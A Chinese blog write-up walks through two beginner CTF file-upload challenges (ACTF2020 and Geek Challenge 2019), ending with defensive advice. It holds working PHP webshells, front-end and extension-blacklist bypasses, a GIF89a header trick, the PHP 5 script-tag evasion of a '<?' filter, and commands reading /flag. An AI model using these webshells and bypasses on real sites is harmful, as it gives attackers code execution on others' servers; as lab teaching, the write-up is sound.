---
title: "Web 文件上传实战：ACTF2020 与 极客大挑战 2019 Upload 详解"
date: 2026-10-24 11:40:00
updated: 2026-10-26 21:10:00
categories:
  - CTF
tags:
  - 文件上传
  - 后缀绕过
  - .htaccess
  - 文件头伪造
  - 一句话木马
  - PHP 短标签
  - ACTF
  - 极客大挑战
description: 用两道入门上传题走一遍“看前端 → 试后端 → 判解析 → 传马 → 拿 flag”的流程：一道靠 .htaccess 解析 .phtml，一道靠 GIF89a 文件头和 PHP 5 老式 script 标签绕过内容黑名单。
difficulty: 入门
topic: 文件上传
permalink: 2026/10/24/web-ctf-upload/
---

{% note primary %}
**一分钟速览**

- **难度**：入门
- **题目**：[ACTF2020 新生赛]Upload、[极客大挑战 2019]Upload
- **考点**：前端校验绕过、后缀黑名单、`Content-Type` / 文件头校验、内容黑名单、`.htaccess` 解析映射
- **第一题关键**：黑名单漏了 `.phtml`，而服务器恰好把 `.phtml` 交给 PHP 解析
- **第二题关键**：内容黑名单只拦 `<?`，改用 PHP 5 的 `<script language="php">` 标签就绕过了
- **一句话思路**：让请求里的 `filename` 保持可执行后缀，再访问它确认真的执行
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：HTTP 请求基础、HTML 表单、浏览器开发者工具（F12）
- **环境**：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 upload-labs）。
- 本文所有测试仅用于**授权靶场和教学**，请勿对未授权的站点进行任何测试。
{% endnote %}

{% note default %}
**做题路线**

`看前端` → `绕前端` → `摸后端黑名单` → `判断能否解析` → `传马` → `定位路径` → `执行命令`
{% endnote %}

## 0. 先补一点基础

### 0.1 文件上传漏洞是怎么产生的

一句话：**上传点把用户上传的文件，当成了服务器可执行的代码。**

正常的图片上传，文件存进去之后只是被 `img` 标签读出来显示；但如果上传目录里的文件会被 PHP 之类的解释器执行，攻击者传一个脚本上去，再访问它，就拿到了代码执行权限（RCE）。

| 上传的文件 | 服务端怎么处理 | 结果 |
| --- | --- | --- |
| 一张图片 | 当静态文件读取、返回 | 正常 |
| 一个 `.php` 脚本 | 交给 PHP 解释器执行 | **RCE** |
| 一个 `.phtml` 脚本 | 取决于服务器配置 | 可能执行，也可能不执行 |

所以文件上传题的核心永远是同一个问题：

> **我能不能让服务端把一个“可执行后缀”的文件存下来，并且它真的会被解析？**

### 0.2 前端校验不是防线

很多上传点会在浏览器里用 JavaScript 检查后缀，比如本题的 `checkFile()`。它确实能挡住普通用户，但**这段代码运行在攻击者的浏览器里**。

| 校验位置 | 谁说了算 | 能挡住攻击者吗 |
| --- | --- | --- |
| 浏览器里的 JS | 攻击者自己 | ❌ 可以关掉、覆盖，或直接发包 |
| 服务端 | 服务端 | ✅ 这才是真防线 |

攻击者完全可以：

- 关掉 JS；
- 覆盖掉那个函数；
- 根本不用浏览器，直接发 HTTP 请求。

判断一个校验是不是“真防线”，标准只有一个：**绕过浏览器之后，服务端还拦不拦。**

### 0.3 服务端可能在哪些地方拦

| 检查点 | 典型做法 | 绕过思路 |
| --- | --- | --- |
| 后缀 | 黑名单 / 白名单 | 黑名单找遗漏（`phtml`、`pht`、`phar`、大小写等）；白名单要靠解析漏洞或配置 |
| Content-Type | 只允许 `image/*` | 请求头是客户端说了算，改成 `image/jpeg` 即可 |
| 文件内容 | `getimagesize()`、magic bytes | 在 payload 前面加 `GIF89a` 等文件头 |
| 文件名 | 随机重命名 | 一般绕不过，但要看它是否**保留后缀** |
| 执行权限 | 上传目录禁止执行脚本 | 这是最有效的防御，一旦做对，传什么都白搭 |

{% note warning %}
本题只做了**后缀黑名单**这一层，而且漏了 `phtml`。先记住这个结论，后面会一步步验证。
{% endnote %}

### 0.4 常见可执行后缀

```text
php  php3  php4  php5  php7  phtml  pht  phar  pgif  inc
```

其中 `phtml`、`pht` 能不能执行，**完全取决于 Web 服务器的配置**。记住这句话，后面会用到。

### 0.5 PHP 的几种“开标签”

上传题的过滤，很多时候盯的就是“文件里有没有 `<?`”。所以要知道 PHP 还有哪些等价写法：

| 写法 | 说明 | PHP 7 |
| --- | --- | --- |
| `<?php ... ?>` | 标准标签，最常用 | ✅ |
| `<? ... ?>` | 短标签，需要 `short_open_tag` 打开 | 取决于配置 |
| `<?= ... ?>` | 短输出标签，等价于 `<?php echo ... ?>` | ✅ |
| `<script language="php"> ... </script>` | PHP 5 专用，7.0 起移除 | ❌ |

最后一种在 PHP 5 时代很常见，**它一个 `<?` 都不含**。碰上“只拦 `<?`”的内容黑名单，这就是现成的绕过写法，第二题会用到。

---

## 1. [ACTF2020 新生赛]Upload

### 1.1 观察题目

打开靶机，页面很朴素，只有一个上传表单：

```html
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
    <input class="input_file" type="file" name="upload_file"/>
    <input class="button" type="submit" name="submit" value="upload"/>
</form>
```

把页面上的线索拆开看：

| 线索 | 值 | 含义 |
| --- | --- | --- |
| `form` 的 `action` | 空 | 提交回 `index.php` 自身处理 |
| 文件字段名 | `upload_file` | 后面构造请求时要用 |
| `onsubmit` | `return checkFile()` | 提交前有一段前端校验 |
| 响应头 | `X-Powered-By: PHP/5.6.40` | PHP 5.x，支持一些 PHP 7 已移除的老式写法 |

### 1.2 前端到底拦了什么

看 `js/main.js`：

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "该文件不允许上传，请上传jpg、png、gif结尾的图片噢！";
        alert(errMsg);
        return false;
    }
}
```

它只做了一件事：**取文件名最后一个点之后的内容，判断是不是 `.jpg` / `.png` / `.gif`。**

也就是说，只要你选的文件叫 `xxx.phtml`，浏览器就会弹窗、表单不提交。但这只是浏览器里的提示。

{% note warning %}
前端只认**最后一个点**后面的内容。`shell.phtml` 会被拦，`shell.jpg` 会放行——代价是服务端真的把文件存成 `.jpg`，永远不会执行。这是本文踩过的第一个坑，详见第 3 章。
{% endnote %}

### 1.3 怎么把 `.phtml` 发出去（不用 Burp）

这是新手最容易卡住的地方：**页面上只有一个按钮，我怎么传别的后缀？**

关键认知：**前端校验和文件最终存成什么后缀，是两件事。** 前者看浏览器里的文件名，后者看 HTTP 请求里的 `filename` 字段。我们要做的是让请求里的 `filename` 保持 `.phtml`，同时让那段 JS 不生效。

{% tabs upload-bypass %}
<!-- tab 方法一 · 禁用 JS @code -->
最简单，也最适合第一次操作。

1. 打开靶机首页，按 `F12` 打开开发者工具；
2. 在 DevTools 里按 `Ctrl+Shift+P` 打开命令面板；
3. 输入 `Disable JavaScript` 并回车；
4. 回到页面按 `F5` 刷新；
5. 选择 `xxx.phtml`，点 upload。

JS 被禁用后，`onsubmit` 里的代码不会执行，表单就是一个普通的 HTML 表单，直接提交。

{% note warning %}
**注意别关掉 F12，一关 JS 就恢复了。**
{% endnote %}
<!-- endtab -->

<!-- tab 方法二 · 覆盖函数 @magic -->
在 Console 里执行：

```javascript
window.checkFile = () => true;
```

然后**不要刷新**，直接选文件上传。`onsubmit` 调用到的就是被替换后的函数。
<!-- endtab -->

<!-- tab 方法三 · 删属性 @wrench -->
F12 → Elements → 找到 `<form ... onsubmit="return checkFile()">`，双击删掉 `onsubmit` 这一段，再点上传。
<!-- endtab -->

<!-- tab 方法四 · 命令行 @terminal -->
完全绕开浏览器：

```bash
curl -F "upload_file=@shell.phtml;type=image/jpeg" \
     -F "submit=upload" \
     "http://<靶机地址>/"
```

`-F` 会把本地文件拼成 `multipart/form-data`，`filename` 自动使用本地文件名，天然带 `.phtml`，完全绕开前端。
<!-- endtab -->
{% endtabs %}

{% note danger %}
**不要用“把文件改名成 .jpg”这种方式过前端。** 因为 `filename` 会跟着变成 `.jpg`，服务端就真的存成 `.jpg` 了——能上传成功，但永远不会执行。**改的是请求，不是文件。**
{% endnote %}

### 1.4 摸清后端的黑名单

前端过了，后端还得试。做法是**同一份内容，换不同后缀分别上传**，观察返回：

| 文件名 | 后端返回 | 结果 |
| --- | --- | --- |
| `a.php` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.php5` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.jpg.php` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.phtml` | `Upload Success! Look here~ ./uplo4d/7105...phtml` | {% label success@落盘 %} |
| `a.pht` | 同上 | {% label success@落盘 %} |
| `a.php.jpg` | 同上，但存成 `.jpg` | {% label warning@不可执行 %} |

几条结论：

1. 后端也检查后缀，而且是**黑名单**，明确拦了 `php`、`php5`；
2. 判断方式同样是“取最后一个扩展名”，所以 `a.php.jpg` 会被当成 jpg 放行，存成 `.jpg` 自然没用；
3. 黑名单漏掉了 `phtml` 和 `pht`。

另外，成功回显里直接给出了**存储目录**（`./uplo4d/`，注意是数字 4）和**完整文件名**，省去了爆破路径的功夫。

### 1.5 关键一步：哪个后缀会被 PHP 解析

`.phtml` 和 `.pht` 都传上去了，但“能上传”不代表“能执行”。直接访问两个文件对比：

| 后缀 | 响应头 | 响应体 | 是否执行 |
| --- | --- | --- | --- |
| `.phtml` | `Content-Type: text/html` | `GIF89a / PWNED` | {% label success@执行了 %} |
| `.pht` | `Content-Type: image/gif` | `GIF89a` | {% label danger@没执行 %} |

`.phtml` 被执行，说明服务端有 mime 映射。拿到 shell 后可以直接看根因：

```apache
# /var/www/html/.htaccess
<FilesMatch \.phtml$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

这就是本题的题眼：**黑名单只防了 `.php`，而 `.htaccess` 又把 `.phtml` 交给了 PHP 处理。** 两者一叠加，绕过路径就唯一确定了。

{% note info %}
如果题目的 `.htaccess` 里是 `AddHandler` 或 `AddType`，行为会有差别：`AddHandler` 对多后缀文件也生效，`AddType` 只认最后一个扩展名。遇到上传题，一定要把服务器配置（`.htaccess`、`httpd.conf`）当成线索来看。
{% endnote %}

### 1.6 构造木马并上传

很多上传点会校验文件头，加一个 `GIF89a` 是零成本的保险，而且完全不影响 PHP 解析——PHP 遇到 `<?php` 之前的非 PHP 文本会原样输出。

```php
GIF89a
<?php system($_GET["c"]); ?>
```

保存为 `shell.phtml`，用 1.3 里的任意一种方式上传，回显：

```text
Upload Success! Look here~ ./uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml
```

这里有个有意思的细节：**这个“随机”文件名其实是 `md5(原文件名)`**。验算一下：

```text
md5("shell.phtml") = 79c93a6bf07761fcc2a020e149f3fc60
```

{% note success %}
路径是**可预测**的——就算不回显，也能自己算出来。服务端把用户提交的 `filename` 原样拿去做 md5，这本身也是一个可以记录下来的信息泄露点。
{% endnote %}

### 1.7 执行命令，拿 flag

```text
GET /uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml?c=id;ls -la /
```

回显：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
-rw-r--r-- 1 root root 43 ... flag
```

Web 根目录里没有 flag，`/flag` 就在根目录下。直接读：

```text
GET ...phtml?c=cat /flag
```

```text
CTF2{a7836b1e-c8a2-4ce8-9678-1081b58f447c}
```

命令执行成功，题目结束。

---

## 2. [极客大挑战 2019]Upload

### 2.1 观察题目

页面同样只有一个上传框：

![极客大挑战 2019 的上传页面](01-upload-form.png)

它和第一题最大的不同是**回显方式**：所有提示都直接怼在页面上，比如 `NOT! php!`、`Don't lie to me, it's not image at all!!!!`、`NO! HACKER! your file included '<?'`。这些标语本身就是线索——每一句对应一层检查。

先记下几个基本信息：

| 线索 | 值 | 含义 |
| --- | --- | --- |
| 处理脚本 | `/upload_file.php` | 抓包可见的上传接口 |
| 文件字段名 | `file` | 构造请求时要用（第一题是 `upload_file`） |
| 上传目录 | `/upload/` | 从访问路径直接看出来 |
| 运行环境 | `X-Powered-By: PHP/5.5.9-1ubuntu4.29` | PHP 5，支持 `<?>`、`<script language="php">` 这些老写法 |

{% note warning %}
这道题**没有**把文件名 md5 化，文件名基本原样保存。第一题里“自己算 md5 找路径”的技巧在这里用不上。
{% endnote %}

### 2.2 第一层：后缀黑名单

照例先直接传 `up.php`。用 Burp 抓包，把 `filename` 改成 `up.php`：

![传 php 被拦](02-php-blacklist.png)

回显 `NOT! php!` ——后缀被黑名单拦下了。

那就换个后缀：`filename` 改成 `up.jpg`，内容先随便塞一段脚本。这次后缀过了，却立刻撞上第二条标语：

![不是图片](03-not-image.png)

`Don't lie to me, it's not image at all!!!!` 说明服务端还会**检查文件内容是不是真的图片**。到这一步可以确定，它至少叠了三层检查：

| 顺序 | 检查点 | 拦截时的回显 |
| --- | --- | --- |
| 1 | 后缀黑名单（`php` 等） | `NOT! php!` |
| 2 | 文件内容像不像图片 | `Don't lie to me, it's not image at all!!!!` |
| 3 | 内容里有没有 `<?` | `NO! HACKER! your file included '<?'` |

### 2.3 第二层：给文件加一个图片头

对付“内容像不像图片”，最省事的就是加文件头，`GIF89a` 就够：

```text
GIF89a
<script language="php">@eval($_POST['a']);</script>
```

`GIF89a` 打头，`getimagesize()` / `finfo` 这类检查基本都能骗过。上传：

![上传成功](04-upload-success.png)

页面回显 `上传文件名：up.jpg` ——**传上去了，但存成了 `.jpg`**。

{% note danger %}
这里很容易误判成“通关了”。`.jpg` 只是通过了后缀检查，服务器不会解析它。**能上传 ≠ 能执行**，这个坑第一题已经踩过一次。
{% endnote %}

### 2.4 第三层：内容里不能出现 `<?`

想执行，后缀必须换成服务器会解析的。把 `filename` 改成 `up.phtml`，内容先用最标准的 PHP：

```text
GIF89a
<?php echo 'UP_OK'; ?>
```

结果：

![内容黑名单拦截](05-content-blacklist.png)

`NO! HACKER! your file included '<?'` ——服务端在**内容里做字符串匹配**，看到 `<?` 就拒绝。

注意这条规则的性质：它不判断“这是不是恶意代码”，只判断“文件里有没有这个字符串”。**凡是字符串黑名单，就一定存在等价写法可以绕过去。**

### 2.5 绕过：改用 `<script language="php">`

0.5 节提过，PHP 5 支持 `<script language="php">` 标签，作用和 `<?php` 完全一样，但一个 `<?` 都不含：

```text
GIF89a
<script language="php">@eval($_POST['a']);</script>
```

从十六进制看，两个检查点同时满足——开头 `47 49 46 38 39 61` 就是 `GIF89a`，后面才是脚本：

![木马文件十六进制](06-script-tag-hex.png)

| 检查 | 看到什么 | 结果 |
| --- | --- | --- |
| 文件头像图片 | 前 6 字节 `GIF89a` | {% label success@通过 %} |
| 内容不含 `<?` | 只有 `<script language="php">` | {% label success@通过 %} |

{% note success %}
这个标签是 **PHP 5 专属**，PHP 7.0 起被彻底移除。题目是 2019 年的，`X-Powered-By: PHP/5.5.9-1ubuntu4.29` 也对得上，正好能用。
{% endnote %}

### 2.6 定位文件，确认它是真解析

这道题基本原样保存文件名，路径就是 `/upload/`。不过我第一版请求把后缀拼成了 `up.phmtl`：

![后缀拼错的请求](07-phmtl-request.png)

服务器照样回“上传成功”，文件也确实落盘了——因为 `phmtl` 不在黑名单里。访问看看：

![访问 phmtl](08-phmtl-url.png)

页面只显示一个 `GIF89a`。文件在，但**没有被 PHP 解析**，`<script language="php">` 又只是浏览器不认识的 script 标签，于是除了文件头什么都看不到。

把后缀改对，重新传 `up.phtml`，再访问：

![访问 phtml](09-parse-check.png)

**同样是只剩 `GIF89a`。** 这两种情况从页面上根本分不清：

| 现象 | 真实原因 |
| --- | --- |
| 只看到 `GIF89a` | 后缀不被解析，文件被当静态文件原样返回 |
| 只看到 `GIF89a` | 后缀被解析，PHP 标签被吃掉、`eval` 没收到参数所以没有输出，剩下的就是文件头 |

所以别用“页面有没有变化”来判断解析——**带参数发一次请求**才算数，这正是坑 8 说的。

### 2.7 传参执行，拿 flag

木马是 `@eval($_POST['a'])`，`a` 里要传的是 **PHP 代码**（见坑 3、坑 4）。用 Burp Repeater 对着上传后的文件发请求：

```http
POST /upload/up.phtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=system('ls%20-al');
```

![执行 ls](10-exec-ls.png)

响应里 `GIF89a` 之后跟着完整的目录列表，命令执行成功。顺带还能看到 `upload/` 里堆满了别人留下的 `1.jpg`、`1.phml`、`2.php.aaa`、`233.php%00.jpg` 之类的文件——**这道题的公开解法都沉淀在这个目录里**，卡壳时不妨拿来对照。

读 flag：

```http
POST /upload/up.phtml HTTP/1.1
Content-Type: application/x-www-form-urlencoded

a=system('cat%20/flag');
```

![拿到 flag](11-flag.png)

```text
GIF89aCTF2{7a3e75f-94e0-44bc-9619-4a13d4c9e1ed}
```

开头的 `GIF89a` 是文件头文本，`CTF2{...}` 才是命令输出——这也再次说明木马真的被执行了。

### 2.8 两题对比

| 维度 | ACTF2020 Upload | 极客大挑战 2019 Upload |
| --- | --- | --- |
| 前端 | 后缀白名单，JS 拦 `.phtml` | 后缀黑名单 |
| 后端后缀 | 黑名单漏了 `phtml` / `pht` | 黑名单拦 `php`，放 `phtml` |
| 内容检查 | 无 | 先查图片头，再查 `<?` |
| 文件名 | `md5(原文件名)` | 原名保存 |
| 为什么能执行 | `.htaccess` 把 `.phtml` 映射给 PHP | 服务器本身就解析 `.phtml` |
| 关键 payload | `<?php system($_GET["c"]); ?>` | `<script language="php">@eval($_POST['a']);</script>` |
| 怎么定位文件 | 看回显，或自己算 md5 | 直接 `/upload/原名` |

一句话总结：**第一题卡在“哪个后缀会被解析”，第二题卡在“文件内容怎么写才不被拦”。**

---

## 3. 我踩过的坑

这一章是真实过程，不是事后润色。每个坑都附上现象和正确做法，方便对照排查。

| # | 坑 | 一句话解法 |
| --- | --- | --- |
| 1 | 把木马改名成 `.jpg` 去骗前端 | 改请求里的 `filename`，不改文件 |
| 2 | 上传的文件内容根本不是木马 | 上传前打开看一眼 |
| 3 | `eval` 里塞系统命令 | 执行命令用 `system()` |
| 4 | 变量函数和 `system()` 混用 | 两种风格别混 |
| 5 | URL 里的特殊字符没编码 | 空格写 `%20`，或改用 POST |
| 6 | 把“上传成功”当成“木马可用” | 按四步逐层验证 |
| 7 | 后缀拼成 `phmtl`，上传“成功”但不解析 | 核对拼写，`phtml` 不是 `phmtl` |
| 8 | 页面只剩 `GIF89a`，判断不了执行没执行 | 带参数发一次请求验证 |

### 坑 1：把木马改名成 `.jpg` 去骗前端

{% label danger@现象 %} 本地把 `x.jpg` 传上去，提示 `Upload Success`，但访问 `upload/3e602dd0....jpg` 什么也不执行。

{% label warning@原因 %} 前端校验看的是浏览器里的文件名，但**服务端保存时用的是请求里的 `filename` 字段**。你把文件真名改成 `.jpg`，等于把 `filename` 也改成了 `x.jpg`，服务端老老实实存成图片后缀。而且这个文件名的 md5 一算就是回显里的名字：

```text
md5("x.jpg") = 3e602dd0ab83a3a8c3f32309bb9a88f9
```

{% label success@正确做法 %} 文件名保持 `.phtml`，用 1.3 的方法让前端 JS 不执行。**改的是请求，不是文件。**

### 坑 2：上传的文件内容根本不是木马

{% label danger@现象 %} 访问上传后的 `.phtml`，浏览器显示的是一个绿色的 "Upload Page" 页面，还带着 `Saved to: upload/xxx.jpg` 的字样。

{% label warning@原因 %} 那个 `.phtml` 文件的内容就是一整页 HTML——大概率是把某个上传练习页面“另存为”成了 `js_webshell.phtml`，然后选错文件上传了。服务端把 HTML 原样返回，浏览器就把它渲染出来了。

用哈希也能确认没传错文件：

```text
md5("js_webshell.phtml") = 919539e3b40ca50dc6764a318ad61c1f
```

{% label success@正确做法 %} 上传前一定在编辑器里打开看一眼内容。文件名叫 `webshell` 不代表它是 webshell。

### 坑 3：`eval` 执行的是 PHP，不是系统命令

{% label danger@现象 %} 木马是

```php
<script language=php>eval($_POST['shell']);</script>
```

传 `shell=ls -al`，页面白屏或报错。

{% label warning@原因 %} `eval()` 执行的是 **PHP 代码**，`ls -al` 不是 PHP 语法，直接 Parse error。

另外 `<script language=php>` 是 PHP 5 时代的老式标签，值的引号写法在部分版本里还会影响识别，PHP 7.0 已经彻底移除。靶机恰好是 PHP 5.6.40 才没在这里翻车。

{% label success@正确做法 %} 要执行命令就用 `system()`：

```php
<?php system($_POST['shell']); ?>
```

或者保持 `eval`，那传进去的必须是 PHP 代码：

```text
shell=system('ls -al');
```

### 坑 4：变量函数调用和 `system(...)` 混用

{% label danger@现象 %}

```text
Fatal error: Function name must be a string in
/var/www/html/uplo4d/919539e3b40ca50dc6764a318ad61c1f.phtml on line 1
```

请求是 `?shell=system('ls -al;')`。

{% label warning@原因 %} 木马写成了变量函数：

```php
<?php $_GET['shell'](); ?>
```

PHP 会把 `$_GET['shell']` 的**值**当成函数名，也就是说它试图调用一个名叫 `system('ls -al;')` 的函数。函数名里不能带括号和参数，于是报错。

{% label success@正确做法 %} 两种风格别混：

| 木马内容 | 传参方式 | 说明 |
| --- | --- | --- |
| `<?php system($_GET['shell']); ?>` | `?shell=ls -al` | 只传命令本身 |
| `<?php eval($_GET['shell']); ?>` | `?shell=system('ls -al');` | 传 PHP 代码 |
| `<?php $_GET['shell'](); ?>` | `?shell=system` | 只传函数名，参数得另外传 |

### 坑 5：URL 里的特殊字符没编码

{% label danger@现象 %} 带空格的命令（`ls -al`）传过去被截断或参数错乱。

{% label warning@原因 %} GET 参数在地址栏里传输，空格、`&`、`#`、`+` 都有自己的含义。

{% label success@正确做法 %} 空格写成 `%20`；或者干脆用 POST，在浏览器控制台里发：

```javascript
fetch('/uplo4d/xxx.phtml', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'shell=' + encodeURIComponent('ls -al /')
}).then(r => r.text()).then(console.log)
```

### 坑 6：把“上传成功”当成“木马可用”

{% label danger@现象 %} 提示 `Upload Success`，但访问没反应。

{% label warning@原因 %} 上传成功只说明**文件写进去了**，不代表后缀会被解析、也不代表文件内容是有效的 PHP。

{% label success@正确做法 %} 按这个顺序验证：

1. 文件内容是否正确（打开看一眼）；
2. 后缀是否会被解析（先传 `<?php echo "test123"; ?>` 试一下）；
3. 路径是否正确（md5 算一下，或看回显）；
4. 最后才上命令执行。

### 坑 7：后缀拼错，上传“成功”却永远不解析

{% label danger@现象 %} 传 `up.phmtl`，提示上传成功，访问后页面只有一个 `GIF89a`，命令怎么都执行不了。

{% label warning@原因 %} 黑名单拦的是 `php` 这类后缀，`phmtl` 不在名单里，所以顺利落盘；可服务器同样不认识 `phmtl`，不会交给 PHP 解析。**“不在黑名单里”和“会被解析”是两回事。**

{% label success@正确做法 %} 构造请求前核对一遍后缀拼写。拿不准就把可执行后缀挨个试一遍（`phtml`、`pht`、`php5`、`php7`……），先用 `echo` 版本确认能解析，再上真 payload。

### 坑 8：只看到 `GIF89a`，判断不了到底执行没执行

{% label danger@现象 %} 访问 `up.phtml`，页面除了文件头 `GIF89a` 什么都没有。

{% label warning@原因 %} 两种情况在页面上长得一模一样：一种是被当静态文件原样返回；另一种是 PHP 确实执行了，但 `eval` 没收到参数、什么也没输出，页面剩下的只有文件头文本。

{% label success@正确做法 %} 别靠“页面有没有变化”猜。直接带参数发一次请求（`a=system('id');`），有输出才算执行；没输出再看响应头里有没有 `X-Powered-By: PHP`。

---

## 4. 完整流程速查表

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看前端拦什么 | 读 `js/main.js`，确认是白名单还是黑名单 |
| 2 | 绕过前端 | 禁用 JS / 覆盖函数 / 删 `onsubmit` / curl |
| 3 | 摸后端黑名单 | 同一内容换后缀逐个试，看返回 |
| 4 | 摸内容检查 | 回显 `not image` → 加 `GIF89a`；回显 `included '<?'` → 换 `<script language="php">` |
| 5 | 判断是否解析 | 访问可执行后缀，再带参数确认 |
| 6 | 找根因 | 读 `.htaccess` / `httpd.conf` |
| 7 | 传马 | `GIF89a` + 一句话 / `system()` |
| 8 | 定位文件 | 回显路径，或 `md5(原文件名).后缀` |
| 9 | 执行命令 | `?c=id`、`?c=cat /flag` |

{% note default %}
**打印版口诀**：看前端拦什么 → 绕过前端 → 摸黑名单 → 摸内容检查 → 判解析 → 传马 → 定位 → 执行。
{% endnote %}

---

## 5. 新手常见问题

{% note info **Q1：页面只能点按钮，我怎么传 `.phtml`？** %}
前端校验只是浏览器里的 JS，禁用 JS 或用开发者工具改请求就行。见 1.3。
{% endnote %}

{% note info **Q2：`.phtml` 传上去了，为什么还是当文本显示？** %}
看响应头。如果 `Content-Type: image/gif`、没有 `X-Powered-By: PHP`，说明服务器没把它当 PHP 解析。多半是缺少 `.htaccess` 里的 Handler 映射。
{% endnote %}

{% note info **Q3：文件明明传成功了，访问却 404？** %}
先看回显路径。这类靶场常常把文件名改成 `md5(原文件名)`，路径和你想的不一样。
{% endnote %}

{% note info **Q4：用 `eval` 为什么不执行 `ls`？** %}
`eval` 执行 PHP 代码，不执行系统命令。用 `system()` / `exec()` / `shell_exec()`。
{% endnote %}

{% note info **Q5：报 `Function name must be a string`？** %}
变量函数调用 `$f()` 只认函数名，不能把 `system('...')` 整个塞进去。见坑 4。
{% endnote %}

{% note info **Q6：靶场地址打不开了？** %}
这类在线靶场地址是临时分配的，过期就失效。可以本地搭 upload-labs 练习，思路完全一样。
{% endnote %}

{% note info **Q7：提示 `NO! HACKER! your file included '<?'` 怎么办？** %}
内容里有 `<?`，被字符串黑名单拦了。换一个不含 `<?` 的等价写法，比如 PHP 5 的 `<script language="php">...</script>`。见 2.5。
{% endnote %}

{% note info **Q8：页面只回显 `GIF89a`，木马到底生效了吗？** %}
看页面判断不了：可能后缀根本不解析，也可能执行了但没传参。带参数请求一次才有结论。见坑 8。
{% endnote %}

---

## 6. 顺手聊聊怎么防

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **上传目录禁止执行脚本** | Nginx/Apache 里关闭上传目录的脚本解析，这一条最关键 |
| ★★★ | **用白名单，不用黑名单** | 只允许 `jpg/png/gif`，其他一律拒绝 |
| ★★☆ | **按内容重命名** | 不要用用户提交的文件名，随机化且不保留用户可控后缀 |
| ★★☆ | **校验真实文件类型** | `getimagesize()` / `finfo` 检查 magic bytes，而不是只看 `Content-Type` |
| ★☆☆ | **不要回显存储路径** | `Upload Success! Look here~ ./uplo4d/xxx` 这种提示等于把路铺好了 |
| ★☆☆ | **不要用字符串黑名单拦内容** | 拦 `<?` 只是自欺欺人：`<script language="php">`、短标签都能绕，黑名单永远列不全 |
| ★☆☆ | **限制大小和数量** | 避免被当成存储滥用 |

{% note success %}
如果只能做一件事，就做第一条：**让上传目录里的文件不能被解析。** 这一步做对，后面传什么都不成立。
{% endnote %}

---

## 7. 总结

这两道题虽然都很简单，但合起来把文件上传的完整链路都覆盖到了：

- **前端校验不是防线**，绕过它只是第一步；
- **“能上传”和“能解析”是两件事**，`.pht` 和 `.phtml` 的对比就是最好的例子；
- **每一层拦截都有它自己的绕过方式**：后缀黑名单靠漏网后缀，图片头检查靠 `GIF89a`，内容黑名单靠 `<?` 的等价写法；
- **黑名单天然有遗漏**，而 `.htaccess` 往往才是决定“为什么偏偏是这个后缀”的最后一环；
- **调试时先确认变量**：文件内容对不对、路径对不对、后缀解析不解析，逐层排除，比一上来就怀疑 payload 有效得多。

> 通用套路可以记成一句话：
>
> **看前端 → 绕后端 → 判解析 → 传马 → 定位路径 → 执行命令**

{% note info %}
本文会继续补充更多文件上传题目。后续题目会按同样的结构追加为新的章节，方便放在一起对比不同靶场的过滤思路。
{% endnote %}
